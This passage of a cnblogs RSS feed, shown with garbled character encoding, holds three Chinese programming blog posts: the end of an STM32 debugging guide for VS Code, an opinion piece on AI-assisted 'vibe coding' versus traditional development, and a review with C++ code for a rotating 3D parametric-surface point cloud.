<p>å°æ­¤éç½®åºå½å·²ç»å®æäºï¼æ¥å¥½stlinkï¼è¿æ¥å¥½stm32åå°±å¯ä»¥æå¿«çè°è¯å¦ï¼ç¹å»ç»¿è²çä¸è§å½¢å¼å§ç¼è¯å¹¶ç§å½å°åçæº<br>
<img src="http://tuchuang-cyy.oss-cn-beijing.aliyuncs.com/img/image-20260220184555431.png" alt="image-20260220184555431" loading="lazy"></p>
<p>ç­å¾ä¸ä¼åï¼å°±ä¼åºç°ä¸å¾æç¤ºçè°è¯çé¢<br>
<img src="http://tuchuang-cyy.oss-cn-beijing.aliyuncs.com/img/image-20260220185452486.png" alt="image-20260220185452486" loading="lazy"><br>
å¨å·¦ä¾§å°±æ¯è°è¯å¸¸ç¨çä¸äºå·¥å·<br>
<img src="http://tuchuang-cyy.oss-cn-beijing.aliyuncs.com/img/image-20260220185552784.png" alt="image-20260220185552784" loading="lazy"></p>
<p>cortex live watchå¯ä»¥å®æ¶æ¥çå¨å±åéçå¼ï¼åªéè¦ç¹å»å å·<br>
<img src="http://tuchuang-cyy.oss-cn-beijing.aliyuncs.com/img/image-20260220185701085.png" alt="image-20260220185701085" loading="lazy"></p>
<p>ç²è´´éè¦æ¥ççåéåç§°</p>
<p><img src="http://tuchuang-cyy.oss-cn-beijing.aliyuncs.com/img/image-20260220185726335.png" alt="image-20260220185726335" loading="lazy"></p>
<p>å°±å¯ä»¥å®æ¶æ¥çå°åéçå¼å¦</p>
<p><img src="http://tuchuang-cyy.oss-cn-beijing.aliyuncs.com/img/image-20260220185758953.png" alt="image-20260220185758953" loading="lazy"></p>
<p>ä»å·¦å°å³ ç¬¬ä¸ä¸ªæ¯éç½®resetï¼æåï¼éè¿ç¨ï¼åæ­¥ï¼åæ­¥è·³åºï¼éæ°å¼å§è°è¯ï¼éåº</p>
<p><img src="http://tuchuang-cyy.oss-cn-beijing.aliyuncs.com/img/image-20260220185836594.png" alt="image-20260220185836594" loading="lazy"></p>
<p>XPERIPHERALSå¿é¡»éç½®ä¸é¢çsvdæä»¶æè½å¤çå°å¯å­å¨åé¨çå¼</p>
<p><img src="http://tuchuang-cyy.oss-cn-beijing.aliyuncs.com/img/image-20260220190044929.png" alt="image-20260220190044929" loading="lazy"></p>
<p>ä½ ä¹å¯ä»¥ä¼éçä½¿ç¨copilotå·¥å·æ´å¿«éçå¼åstm32å¦</p>
<h3 id="stm32-svdæä»¶">stm32 svdæä»¶</h3>
<p>stmç³»åsvdä»åºï¼</p>
<p><a href="https://github.com/modm-io/cmsis-svd-stm32" target="_blank" rel="noopener nofollow">modm-io/cmsis-svd-stm32: CMSIS SVD files for all STM32 devices</a></p>


</div>
<div class="clear"></div>

            </div>
            <div class="postDesc">posted @ 
<span id="post-date" data-last-update-days="0.004166666666666667" data-date-updated="2026-02-20 19:37">2026-02-20 19:31</span>&nbsp;
<a href="https://www.cnblogs.com/chenyouyuan">ChenYY~</a>&nbsp;
éè¯»(<span id="post_view_count">8</span>)&nbsp;
è¯è®º(<span id="post_comment_count">0</span>)&nbsp;
&nbsp;
<a href="javascript:void(0)" onclick="AddToWz(19626759);return false;">æ¶è</a>&nbsp;
<a href="javascript:void(0)" onclick="reportManager.report({ currentUserId: '', targetType: 'blogPost', targetId: '19626759', targetLink: 'https://www.cnblogs.com/chenyouyuan/p/19626759', title: 'ææææä½ ä½¿ç¨vscodeå¼åstm32ï¼' })">ä¸¾æ¥</a>
</div>
         ]]>
    </description>
    </item>
<item>
    <title><![CDATA[ âèä¸è¥¿ï¼ä½ æ¦å¼±äºâââå³äºVibe Codingä¸ä¼ ç»å¼å ]]></title>
    <link>https://www.cnblogs.com/SilverGo/p/19626693</link>
    <guid>34a9d8c948cd55d1615231e85362895d</guid>
    <description>
    <![CDATA[ 
            <h1 class="postTitle">
                <a id="cb_post_title_url" class="postTitle2 vertical-middle" href="https://www.cnblogs.com/SilverGo/p/19626693" title="åå¸äº 2026-02-20 17:51">
    <span role="heading" aria-level="2">âèä¸è¥¿ï¼ä½ æ¦å¼±äºâââå³äºVibe Codingä¸ä¼ ç»å¼å</span>
    

</a>

            </h1>
            <div class="clear"></div>
            <div class="postBody">
                <div id="cnblogs_post_body" class="blogpost-body cnblogs-markdown">
<h1 id="åè¨">åè¨</h1>
<p>éäººå¨æ¨å¤©å·è§é¢çæ¶åï¼æå¤å·å°äºè¿æ ·çä¸ä¸ªvideoï¼<br>
ä¸å¹æ¢å¾ï¼åä¸¾äº2025å¹´å2023å¹´çä¸¤å¥å¼åå·¥å·ï¼<br>
2025å¹´ï¼æä»¬ç¨TRAEãClaudeãCopilotãWindows 11ï¼<br>
2023å¹´ï¼æä»¬ç¨ClionãIDEAãVimãEmacsãperfãlldbãgdbãLinuxã<br>
ææ¡æ¯ï¼âèä¸è¥¿ï¼ä½ æ¦å¼±äºï¼â</p>
<h1 id="_"></h1>
<p>ä»æçæ¥è®²ï¼æ¯«æ çé®ï¼2025å¹´çè¿ä¸å¥å·¥å·ä¸ä»å¼åæçå¤§å¹ä¸æ¶¨ï¼æ¶é´ææ¬éä½ï¼ä»å·¥å·æ¬èº«èè¨ï¼å¶ææ¯é¾åº¦ä¹ä¸æ¶¨äºã<br>
ä½æ¯ï¼ä»ç¨åºåçè§åº¦èè¨ï¼æä»¬ä¸§å¤±äºå¯¹åºå±çææ§ï¼<br>
2025å¹´ï¼å¨å¨å´ï¼ä»ä¹é½è§£å³äºã<br>
2023å¹´ï¼ä¸åé½è¦èªå·±å¨æã<br>
2025å¹´çæä»¬ï¼ä¸åæçè³ä¸ï¼æä»¬å©ç¨AIï¼å°åäºå¾å¤åæ¥éè¦èªå·±åçä»£ç ï¼<br>
å¯æä»¬é¾éä¸åºè¯¥æ³æ³ï¼è¿ççå¯¹åï¼</p>
<p>æä»¬åºè¯¥é®èªå·±ï¼å½åä¸ºä»ä¹åæ¬¢CSï¼<br>
ä¸å°±æ¯å ä¸ºCSæ¬èº«çèªç±ãè§£æä¸å»ºæåï¼<br>
æä»¬éæ©AIæ¿æä»¬åä»£ç ï¼æ¯ä¸ç§å°æªæ¥äº¤ç»é»ççè¡ä¸ºã<br>
ä¸æ¦åºç°äºéèçãAIæ¹ä¸åºæ¥çéè¯¯ï¼è¿äºé¿æä½¿ç¨AIçâç¨åºåâå°ç´æ¥å»ç¼ã<br>
ç¨åºåæç»æ¯è¦é ä»£ç å»ºæä¸ççï¼èä¸æ¯PUA Agentçã</p>
<p>ä½æ¯å®å¨æå¼AIä¹æ¯ä¸ç°å®çï¼é£ä¹æä¹æè¡¡å¢ï¼<br>
ä»¥ä¸æ¯éäººçæè§ï¼<br>
1.å°AIå½ä½ä¸ä¸ªé«çº§çæå<br>
2.æ ¸å¿ä»£ç å¿é¡»èªå·±å<br>
3.éå¤æ§çä»£ç ï¼æ¯å¦è¡¥å¨æä¸ªswitchï¼å¯ä»¥ä½¿ç¨AI<br>
4.æ¶æè®¨è®ºå¯ä»¥ä½¿ç¨AI</p>
<h1 id="ç»è¯­">ç»è¯­</h1>
<p>è¿ç¯æç« éå¸¸ç­ï¼èä¸å ä¸ºæ¶é´åå ï¼åçæ¯è¾ä»ä¿ï¼ä½æ¯ææå°äºå³å¯<br>
å¨ç°å¨çAIæ¶ä»£ï¼æä»¬è¿½æ±æçè³ä¸ï¼ä½æ¯æä»¬æ´åºè¯¥æææ¬å¿ãåå®åå¿<br>
é¿æå®å¨ä¾èµAIåªä¼åå¼±èªå·±çè½åï¼å¦ææ³°æ¥ãç©æå¿åï¼è¿æ¯å¿ç¶ç<br>
äºè§£åºå±ãå¨æ²¡æAIçæåµä¸ç§æ ·è½å¤ååºå®ç¾çä»£ç ï¼è¿ææ¯ç¨åºåæ°´å¹³é«çè¡¨ç°<br>
è°¢è°¢éè¯»</p>


</div>
<div class="clear"></div>

            </div>
            <div class="postDesc">posted @ 
<span id="post-date" data-last-update-days="0" data-date-updated="2026-02-20 17:51">2026-02-20 17:51</span>&nbsp;
<a href="https://www.cnblogs.com/SilverGo">Ghost-Face</a>&nbsp;
éè¯»(<span id="post_view_count">2</span>)&nbsp;
è¯è®º(<span id="post_comment_count">0</span>)&nbsp;
&nbsp;
<a href="javascript:void(0)" onclick="AddToWz(19626693);return false;">æ¶è</a>&nbsp;
<a href="javascript:void(0)" onclick="reportManager.report({ currentUserId: '', targetType: 'blogPost', targetId: '19626693', targetLink: 'https://www.cnblogs.com/SilverGo/p/19626693', title: 'âèä¸è¥¿ï¼ä½ æ¦å¼±äºâââå³äºVibe Codingä¸ä¼ ç»å¼å' })">ä¸¾æ¥</a>
</div>
         ]]>
    </description>
    </item>
<item>
    <title><![CDATA[ å°ä»£ç ï¼å¤§è§éï¼è¯ä¸ä¸ªå¸åçâæ°å­¦å¯è§å + è®¡ç®æºå¾å½¢å­¦å¥é¨âçä¼ç§æ¡ä¾(C++ç²¾çµåº3Dæ¡ä¾) ]]></title>
    <link>https://www.cnblogs.com/lixingqiu/p/19626608</link>
    <guid>43f5fa110c14ff50e9edf9dfcfd2a71c</guid>
    <description>
    <![CDATA[ 
	<h1 class="postTitle"><a id="cb_post_title_url" class="postTitle2 vertical-middle" href="https://www.cnblogs.com/lixingqiu/p/19626608" title="åå¸äº 2026-02-20 16:43">
    <span role="heading" aria-level="2">å°ä»£ç ï¼å¤§è§éï¼è¯ä¸ä¸ªå¸åçâæ°å­¦å¯è§å + è®¡ç®æºå¾å½¢å­¦å¥é¨âçä¼ç§æ¡ä¾(C++ç²¾çµåº3Dæ¡ä¾)</span>
    

</a>
</h1>
	<div id="cnblogs_post_body" class="blogpost-body blogpost-body-html">
<p><span data-cke-copybin-start="1"><span data-cke-copybin-start="1">âçè§é¢å¨è¿éï¼https://www.douyin.com/video/7608839461102734592</span></span></p>
<p><span data-cke-copybin-start="1"><span data-cke-copybin-start="1">ç¨åºä»£ç å¨æä¸é¢ã</span></span></p>
<p><span id="cke_bm_12069S">&nbsp;</span><span id="cke_bm_12069S">è¿ä»½ä»£ç åè§é¢å±ç¤ºäºä¸ä¸ªéå¸¸å¸åçâæ°å­¦å¯è§å + è®¡ç®æºå¾å½¢å­¦å¥é¨âçä¼ç§æ¡ä¾ãå®ä¸ä»ä»æ¯ä¸æ®µè½è¿è¡çä»£ç ï¼æ´æ¯ä¸ä¸ªå°æ½è±¡æ°å­¦å¬å¼è½¬åä¸ºç´è§è§è§èºæ¯çæå­¦æ¼ç¤ºã</span></p>
<p><em id="__mceDel"><span id="cke_bm_12069S"> ä»¥ä¸æ¯å¯¹è¯¥ç¨åºåè§é¢çå¤ç»´åº¦è¯è®ºï¼</span></em></p>
<h2>1. ææ¯å®ç°ä¸å¾å½¢å­¦åç</h2>
<p>è¿æ®µä»£ç è½ç¶ç®ç­ï¼ä½å®æ´å®ç°äºä¸ä¸ªå¾®å3D æ¸²æç®¡çº¿çæ ¸å¿é»è¾ï¼è¿å¯¹äº C++ åå­¦èæ¥è¯´éå¸¸æä»·å¼ï¼åæ°åæ²é¢å»ºæ¨¡ï¼<br>
ä»£ç æ ¸å¿å¨äºé£ä¸è¡åæ è®¡ç®å¬å¼ï¼</p>
<div class="cke_widget_wrapper cke_widget_block cke_widget_codeSnippet cke_widget_selected" data-cke-display-name="ä»£ç æ®µ" data-cke-filter="off" data-cke-widget-id="7" data-cke-widget-wrapper="1">
<pre class="cke_widget_element" data-cke-widget-data="%7B%22classes%22%3Anull%2C%22lang%22%3A%22cpp%22%2C%22code%22%3A%22p.x%20%3Da%20*%20cos(v)%20*%20sin(u)%3B%5Cnp.y%20%3Da%20*%20cos(u)%20*%20cos(v)%3B%5Cnp.z%20%3D%20-a%20*%20sin(v)%3B%22%7D" data-cke-widget-keep-attr="0" data-widget="codeSnippet"><code class="hljs language-cpp">p.x =a * <span class="hljs-built_in">cos(v) * <span class="hljs-built_in">sin(u);
p.y =a * <span class="hljs-built_in">cos(u) * <span class="hljs-built_in">cos(v);
p.z = -a * <span class="hljs-built_in">sin(v);</span></span></span></span></span></code></pre>
<span class="cke_reset cke_widget_drag_handler_container"><img width="15" height="15" class="cke_reset cke_widget_drag_handler lazyload" title="ç¹å»å¹¶ææ½ä»¥ç§»å¨" data-cke-widget-drag-handler="1" data-src="https://img2024.cnblogs.com/blog/523461/202602/523461-20260220164341919-1115310452.gif"></span></div>
<p>å¶ä¸­a=uãè¿æ¯ä¸ä¸ªåæ°æ¹ç¨ï¼éè¿&nbsp;u å&nbsp;v ä¸¤ä¸ªåéçååçæä¸ç»´ç©ºé´ä¸­çç¹éãè§é¢å±ç¤ºçå½¢æç±»ä¼¼äºä¸ä¸ªèºææ²é¢æåå½¢çåé¥é¢ãè¿ç§å°æ°å­¦å¬å¼ç´æ¥æ å°ä¸ºå ä½å½¢ç¶çåæ³ï¼æ¯è®¡ç®æºå¾å½¢å­¦çåºç¡ã</p>
<ul>
<li>3D åæ¢ï¼æè½¬ï¼ï¼</li>
</ul>
<p>rotateY å½æ°å®ç°äºæ åçæè½¬ç©éµè¿ç®ãéè¿æ¯ä¸å¸§å¢å  rotate_angleï¼å®ç°äºç©ä½ç» Y è½´çè¿ç»­æè½¬å¨ç»ãè¿æ¯çè§£ 3D ç©ºé´åæ¢æç´è§çæ¹å¼ã</p>
<ul>
<li>éè§æå½±ï¼Perspective Projectionï¼ï¼</li>
</ul>
<p>project å½æ°ä¸­ double factor = scale / (2.0 + p.z); æ¯ç¹çä¹ç¬ãå®æ¨¡æäºäººç¼âè¿å¤§è¿å°âçè§è§ææãå¦ææ²¡æè¿ä¸è¡ï¼ç©ä½æè½¬æ¶çèµ·æ¥ä¼æ¯å¹³é¢çï¼å ä¸è¿ä¸è¡åï¼Z è½´çæ·±åº¦æç«å»æ¾ç°åºæ¥ã</p>
<ul>
<li>åç¼å²ææ¯ï¼</li>
</ul>
<p>screen.tracer(0) å screen.update() çéåä½¿ç¨ï¼æå³çç¨åºéç¨äºåç¼å²æºå¶ãåå¨åç¼å²åºç»å¶å®ææç¹ï¼åä¸æ¬¡æ§æ¾ç¤ºå°å±å¹ãè¿ææé¿åäºç»é¢ç»å¶è¿ç¨ä¸­çéªçï¼ä¿è¯äºå¨ç»çæµçæ§ã</p>
<h2>2. è§è§ææä¸ç¾å­¦</h2>
<p>&nbsp;</p>
<ul>
<li>ç¹äºé£æ ¼ï¼Point Cloudï¼ï¼</li>
</ul>
<p>ç¨åºæ²¡æä½¿ç¨çº¿æ¡ï¼Lineï¼æå¤è¾¹å½¢ï¼Polygonï¼å¡«åï¼èæ¯ä½¿ç¨äº dot(1) ç»å¶ç¹ãè¿ç§ç¹äºæ¸²æé£æ ¼ä¸ä»èçäºè®¡ç®éï¼ä¸éè¦å¤çé®æ¡ååæ åï¼ï¼èä¸äº§çäºä¸ç§å¤å¤çãç±»ä¼¼ç¤ºæ³¢å¨ææ©æç¢éæ¾ç¤ºå¨çç§ææã</p>
<ul>
<li>å¨æçè²ï¼</li>
</ul>
<p>pen.color(x+y) è¿è¡ä»£ç éå¸¸å·§å¦ãå®æ²¡æä½¿ç¨å¤æççº¹çæåç§æ¨¡åï¼èæ¯æ ¹æ®å±å¹åæ (x,y) çåæ¥æ å°é¢è²ã<br>
ä¼ç¹ï¼è®¡ç®ææ¬æä½ï¼ä¸éçç©ä½æè½¬ï¼å±å¹åæ ååï¼é¢è²ä¹ä¼éä¹æµå¨ï¼äº§çäºä¸ç§å½©è¹è¬çæµåææï¼æå¤§å°å¢å¼ºäºè§è§å¸å¼åã<br>
ç¼ºç¹ï¼é¢è²æ¯ç»å®å¨å±å¹ç©ºé´èéç©ä½è¡¨é¢çï¼æä»¥é¢è²ä¼éæè½¬âæ»å¨âï¼ä½è¿æ°æ°å½¢æäºä¸ç§ç¬ç¹çå¨æç¾æã</p>
<ul>
<li>éæ ·å¯åº¦ï¼</li>


</ul>
<p>u_steps å v_steps åè®¾ä¸º 250ï¼æå³çæ¯å¸§è¦è®¡ç®å¹¶ç»å¶&nbsp;250Ã250=62,500&nbsp;ä¸ªç¹ãå¨ C++ ä¸­è¿ä¸ªè®¡ç®éå®å¨å¯ä»¥æ¥åï¼è§é¢ä¸­ä¹ç¡®å®å±ç¤ºäºç»è»ä¸å¯éçæ²é¢ç»æã</p>
<h2>3. æè²æä¹ä¸å·¥å·æ¨å¹¿</h2>
<p>&nbsp;</p>
<ul>
<li>éä½ C++ å¾å½¢ç¼ç¨é¨æ§ï¼</li>


</ul>
<p>ä¼ ç»ç C++ å¾å½¢ç¼ç¨ï¼å¦ OpenGL/DirectXï¼éç½®ç¯å¢å¤æï¼API ç¹çãè§é¢ä¸æ¹çæå­è¯´ææå°äº âC++ ç²¾çµåºâ å DevC++ãè¿è¡¨æè¯¥ç¨åºæ¨å¨éè¿å°è£å¥½çç®æåºï¼è®©ä¸­å­¦çæç¼ç¨åå­¦èè½å¿«éçå°å¾å½¢åææï¼å¢å¼ºå­¦ä¹ ä¿¡å¿ã</p>
<ul>
<li>è·¨å­¦ç§èåï¼</li>


</ul>
<p>è¿ä¸ªæ¡ä¾å®ç¾èåäºæ°å­¦ï¼ä¸è§å½æ°ãåæ°æ¹ç¨ï¼ãç©çï¼ç©ºé´æè½¬ï¼åè®¡ç®æºç§å­¦ï¼å¾ªç¯ãç»æä½ãåæ æ å°ï¼ãå®æ¯ STEM æè²ä¸­éå¸¸å¥½çç´ æã</p>
<h2>4. æ¹è¿å»ºè®®ä¸æè</h2>
<p>è½ç¶ç¨åºè¿è¡ææå¾å¥½ï¼ä½å¦ææ³è¿ä¸æ­¥ä¼åææ·±å¥å­¦ä¹ ï¼å¯ä»¥èèä»¥ä¸æ¹åï¼</p>
<ul>
<li>æ·±åº¦ç¼å²ï¼Z-Bufferingï¼ï¼</li>


</ul>
<p>ç®åçç»å¶é¡ºåºæ¯åºå®çãå¦ææ²é¢èªèº«åçé®æ¡ï¼ä¾å¦æè½¬ 180 åº¦åï¼èé¢è·å°åé¢ï¼ï¼ç®åçé»è¾å¯è½ä¼æèé¢çç¹ç»å¨æ­£é¢çç¹ä¸é¢ï¼å¯¼è´è§è§ç©¿å¸®ãå¼å¥ Z ç¼å²å¯ä»¥è§£å³é®æ¡å³ç³»ã</p>
<ul>
<li>åç§æ¨¡åï¼</li>


</ul>
<p>ç®åçé¢è²ä»ä¾èµåæ ãå¦æå¼å¥æ³åéè®¡ç®åç®åçåç§ï¼å¦ Phong æ¨¡åï¼ï¼æ²é¢çç«ä½æä¼æ´å¼ºï¼è½æ´æ¸æ°å°çåºå¹å¸ç»æã</p>
<ul>
<li>äº¤äºæ§ï¼</li>


</ul>
<p>ç®ååªè½èªå¨æè½¬ãå¦æè½éè¿é¼ æ æå¨æ¹å rotate_angleï¼æèéè¿é®çæ¹ååæ°a çç³»æ°ï¼ç¨æ·å°±è½å®æ¶æ¢ç´¢ä¸ååæ°ä¸çæ²é¢å½¢æï¼äºå¨æ§ä¼å¤§å¤§å¢å¼ºã</p>
<ul>
<li>æ§è½ä¼åï¼</li>


</ul>
<p>è½ç¶ 6 ä¸ç¹ä¸å¤ï¼ä½å¦æè¦å¢å å¯åº¦ï¼å¯ä»¥èèåªç»å¶å¯è§é¢ï¼æèä½¿ç¨ GPU å éï¼Shaderï¼ï¼ä¸è¿å¯¹äºå­¦ä¹  CPU é»è¾æ¥è¯´ï¼å½åæ¹æ¡å·²ç»è¶³å¤å¥½ã</p>
<h2>æ»ç»</h2>
<p>è¿æ¯ä¸ä¸ªå¸åçâå°ä»£ç ï¼å¤§è§éâçä¼ç§ä½åã<br>
å®è¯æäºä¸éè¦åºå¤§çæ¸¸æå¼æï¼ä»å­åºç¡ç C++ è¯­æ³åæ°å­¦ç¥è¯ï¼å°±è½åé åºä»¤äººæå¹çè§è§èºæ¯ãå¯¹äºè§é¢ä½èèè¨ï¼è¿ä¸ä»å±ç¤ºäºç¼ç¨è½åï¼æ´å±ç¤ºäºå¯¹æ°å­¦ä¹ç¾ççè§£ãå¯¹äºè§ä¼èè¨ï¼è¿æ¯ä¸ä¸ªæä½³ç C++ å¾å½¢åå¥é¨å¯èï¼è½æ¿åå¾å¤äººå¯¹âä»£ç å¦ä½åé ä¸çâçå¥½å¥å¿ã</p>
<p>è¯åï¼âââââ&nbsp; (ä½ä¸ºæå­¦æ¼ç¤ºåæ°å­¦å¯è§åæ¡ä¾)</p>
<div class="cnblogs_code">
<pre>#include <span style="color: rgba(128, 0, 0, 1)">"</span><span style="color: rgba(128, 0, 0, 1)">sprites.h</span><span style="color: rgba(128, 0, 0, 1)">"</span>  <span style="color: rgba(0, 128, 0, 1)">//</span><span style="color: rgba(0, 128, 0, 1)">åå«C++ç²¾çµåº</span>
#include &lt;cmath&gt;      <span style="color: rgba(0, 128, 0, 1)">//</span><span style="color: rgba(0, 128, 0, 1)"> æ°å­¦åºï¼sin/cos/Ïç­ï¼</span>
#include &lt;vector&gt;     <span style="color: rgba(0, 128, 0, 1)">//</span><span style="color: rgba(0, 128, 0, 1)"> å­å¨é¡¶ç¹åæ </span>
<span style="color: rgba(0, 0, 0, 1)">
Screen screen;
Sprite pen{</span><span style="color: rgba(128, 0, 0, 1)">"</span><span style="color: rgba(128, 0, 0, 1)">blank</span><span style="color: rgba(128, 0, 0, 1)">"</span><span style="color: rgba(0, 0, 0, 1)">};  

</span><span style="color: rgba(0, 0, 255, 1)">const</span> <span style="color: rgba(0, 0, 255, 1)">double</span> PI = M_PI;    <span style="color: rgba(0, 128, 0, 1)">//</span><span style="color: rgba(0, 128, 0, 1)"> å®ä¹å¸¸é</span>
<span style="color: rgba(0, 0, 255, 1)">double</span> rotate_angle = <span style="color: rgba(128, 0, 128, 1)">0.0</span>;  <span style="color: rgba(0, 128, 0, 1)">//</span><span style="color: rgba(0, 128, 0, 1)"> æè½¬è§åº¦å¢éï¼æ§å¶å¨ç»éåº¦ï¼</span>
<span style="color: rgba(0, 0, 255, 1)">struct</span> Point3D {    <span style="color: rgba(0, 0, 255, 1)">double</span> x, y, z;};  <span style="color: rgba(0, 128, 0, 1)">//</span><span style="color: rgba(0, 128, 0, 1)"> 3Dç¹ç»æä½

</span><span style="color: rgba(0, 128, 0, 1)">//</span><span style="color: rgba(0, 128, 0, 1)"> 3Dç¹ç»Yè½´æè½¬ï¼å®ç°å¨ææè½¬ææï¼</span>
Point3D rotateY(Point3D p, <span style="color: rgba(0, 0, 255, 1)">double</span><span style="color: rgba(0, 0, 0, 1)"> angle) {
    </span><span style="color: rgba(0, 0, 255, 1)">double</span> cos_a =<span style="color: rgba(0, 0, 0, 1)"> cos(angle);
    </span><span style="color: rgba(0, 0, 255, 1)">double</span> sin_a =<span style="color: rgba(0, 0, 0, 1)"> sin(angle);
    </span><span style="color: rgba(0, 0, 255, 1)">return</span><span style="color: rgba(0, 0, 0, 1)"> {
        p.x </span>* cos_a - p.z *<span style="color: rgba(0, 0, 0, 1)"> sin_a,
        p.y,
        p.x </span>* sin_a + p.z *<span style="color: rgba(0, 0, 0, 1)"> cos_a
    };
}

</span><span style="color: rgba(0, 128, 0, 1)">//</span><span style="color: rgba(0, 128, 0, 1)"> éè§æå½±ï¼3Dè½¬2Dï¼ç®åçï¼å¢å¼ºZè½´æ·±åº¦æï¼</span>
<span style="color: rgba(0, 0, 255, 1)">void</span> project(Point3D p, <span style="color: rgba(0, 0, 255, 1)">int</span>&amp; screen_x, <span style="color: rgba(0, 0, 255, 1)">int</span>&amp; screen_y, <span style="color: rgba(0, 0, 255, 1)">double</span> scale = <span style="color: rgba(128, 0, 128, 1)">100.0</span><span style="color: rgba(0, 0, 0, 1)">) {
    </span><span style="color: rgba(0, 0, 255, 1)">double</span> factor = scale / (<span style="color: rgba(128, 0, 128, 1)">2.0</span> + p.z);  <span style="color: rgba(0, 128, 0, 1)">//</span><span style="color: rgba(0, 128, 0, 1)"> éè§å å­ï¼Zè¶å¤§ï¼æå½±è¶å°ï¼</span>
    screen_x = static_cast&lt;<span style="color: rgba(0, 0, 255, 1)">int</span>&gt;(p.x *<span style="color: rgba(0, 0, 0, 1)"> factor);
    screen_y </span>= static_cast&lt;<span style="color: rgba(0, 0, 255, 1)">int</span>&gt;(p.y *<span style="color: rgba(0, 0, 0, 1)"> factor);
}

</span><span style="color: rgba(0, 0, 255, 1)">int</span><span style="color: rgba(0, 0, 0, 1)"> main() {        
    screen.title(</span><span style="color: rgba(128, 0, 0, 1)">"</span><span style="color: rgba(128, 0, 0, 1)">ä½èï¼æå´ç</span><span style="color: rgba(128, 0, 0, 1)">"</span>).bgcolor(<span style="color: rgba(128, 0, 0, 1)">"</span><span style="color: rgba(128, 0, 0, 1)">black</span><span style="color: rgba(128, 0, 0, 1)">"</span>).tracer(<span style="color: rgba(128, 0, 128, 1)">0</span><span style="color: rgba(0, 0, 0, 1)">);
    pen.hide().pu();
    
     </span><span style="color: rgba(0, 128, 0, 1)">//</span><span style="color: rgba(0, 128, 0, 1)"> éååæ°uåvï¼è®¡ç®å¹¶ç»å¶ææç¹</span>
    <span style="color: rgba(0, 0, 255, 1)">const</span> <span style="color: rgba(0, 0, 255, 1)">int</span> u_steps = <span style="color: rgba(128, 0, 128, 1)">250</span>;  <span style="color: rgba(0, 128, 0, 1)">//</span><span style="color: rgba(0, 128, 0, 1)"> uæ¹åéæ ·æ°ï¼è¶å¤è¶ç²¾ç»ï¼</span>
    <span style="color: rgba(0, 0, 255, 1)">const</span> <span style="color: rgba(0, 0, 255, 1)">int</span> v_steps =<span style="color: rgba(128, 0, 128, 1)">250</span>;  <span style="color: rgba(0, 128, 0, 1)">//</span><span style="color: rgba(0, 128, 0, 1)"> væ¹åéæ ·æ°</span>
    <span style="color: rgba(0, 0, 255, 1)">double</span> u_inc = <span style="color: rgba(128, 0, 128, 1)">2</span> * PI /<span style="color: rgba(0, 0, 0, 1)"> u_steps;
    </span><span style="color: rgba(0, 0, 255, 1)">double</span> v_inc = <span style="color: rgba(128, 0, 128, 1)">2</span> * PI / v_steps;  <span style="color: rgba(0, 128, 0, 1)">//</span><span style="color: rgba(0, 128, 0, 1)"> vèå´-Ï~Ïï¼æ»è·¨åº¦2Ï</span>
   
    <span style="color: rgba(0, 0, 255, 1)">while</span><span style="color: rgba(0, 0, 0, 1)"> (screen.exitonclick() ) {        
        screen.clear();   </span><span style="color: rgba(0, 128, 0, 1)">//</span><span style="color: rgba(0, 128, 0, 1)"> æ¸ç©ºå±å¹ï¼æ¯ä¸å¸§éæ°ç»å¶ï¼           </span>
        
        <span style="color: rgba(0, 0, 255, 1)">for</span> (<span style="color: rgba(0, 0, 255, 1)">int</span> i = <span style="color: rgba(128, 0, 128, 1)">0</span>; i &lt;= u_steps; ++<span style="color: rgba(0, 0, 0, 1)">i) {
            </span><span style="color: rgba(0, 0, 255, 1)">double</span> u = i *<span style="color: rgba(0, 0, 0, 1)"> u_inc;
            </span><span style="color: rgba(0, 0, 255, 1)">double</span> a = u;  <span style="color: rgba(0, 128, 0, 1)">//</span><span style="color: rgba(0, 128, 0, 1)"> a = uï¼å¬å¼è¦æ±ï¼</span>
            <span style="color: rgba(0, 0, 255, 1)">for</span> (<span style="color: rgba(0, 0, 255, 1)">int</span> j = <span style="color: rgba(128, 0, 128, 1)">0</span>; j &lt;= v_steps; ++<span style="color: rgba(0, 0, 0, 1)">j) {
                </span><span style="color: rgba(0, 0, 255, 1)">double</span> v = -PI + j * v_inc;  <span style="color: rgba(0, 128, 0, 1)">//</span><span style="color: rgba(0, 128, 0, 1)"> vä»-Ïå°Ï               </span>
                Point3D p;   <span style="color: rgba(0, 128, 0, 1)">//</span><span style="color: rgba(0, 128, 0, 1)"> è®¡ç®åå§3Dåæ ï¼èçæ²é¢å¬å¼ï¼</span>
                p.x =a * cos(v) *<span style="color: rgba(0, 0, 0, 1)"> sin(u);
                p.y </span>=a * cos(u) *<span style="color: rgba(0, 0, 0, 1)"> cos(v);
                p.z </span>= -a *<span style="color: rgba(0, 0, 0, 1)"> sin(v);
                </span><span style="color: rgba(0, 128, 0, 1)">//</span><span style="color: rgba(0, 128, 0, 1)"> ç»Yè½´æè½¬ï¼ä»èå®ç°å¨æ3Dææ</span>
                p =<span style="color: rgba(0, 0, 0, 1)"> rotateY(p, rotate_angle);               
                </span><span style="color: rgba(0, 0, 255, 1)">int</span><span style="color: rgba(0, 0, 0, 1)"> x, y;
                project(p, x, y);   </span><span style="color: rgba(0, 128, 0, 1)">//</span><span style="color: rgba(0, 128, 0, 1)"> æå½±å°2Då±å¹åæ </span>
                <span style="color: rgba(0, 0, 255, 1)">if</span>(x&gt;=<span style="color: rgba(128, 0, 128, 1)">400</span> || x&lt;=-<span style="color: rgba(128, 0, 128, 1)">400</span> || y&gt;=<span style="color: rgba(128, 0, 128, 1)">300</span> || y&lt;= -<span style="color: rgba(128, 0, 128, 1)">300</span>)<span style="color: rgba(0, 0, 255, 1)">continue</span><span style="color: rgba(0, 0, 0, 1)">; 
                pen.color(x</span>+y).go(x, y).dot(<span style="color: rgba(128, 0, 128, 1)">1</span>);  <span style="color: rgba(0, 128, 0, 1)">//</span><span style="color: rgba(0, 128, 0, 1)"> ç»å¶å½åç¹     </span>
<span style="color: rgba(0, 0, 0, 1)">            
            }
        }
        screen.update();
        rotate_angle </span>+= <span style="color: rgba(128, 0, 128, 1)">0.02</span><span style="color: rgba(0, 0, 0, 1)">;
        </span><span style="color: rgba(0, 0, 255, 1)">if</span> (rotate_angle &gt; <span style="color: rgba(128, 0, 128, 1)">2</span> * PI) rotate_angle -= <span style="color: rgba(128, 0, 128, 1)">2</span> * PI;  <span style="color: rgba(0, 128, 0, 1)">//</span><span style="color: rgba(0, 128, 0, 1)"> éç½®è§åº¦ï¼é¿åæº¢åº        </span>
<span style="color: rgba(0, 0, 0, 1)">    }
    
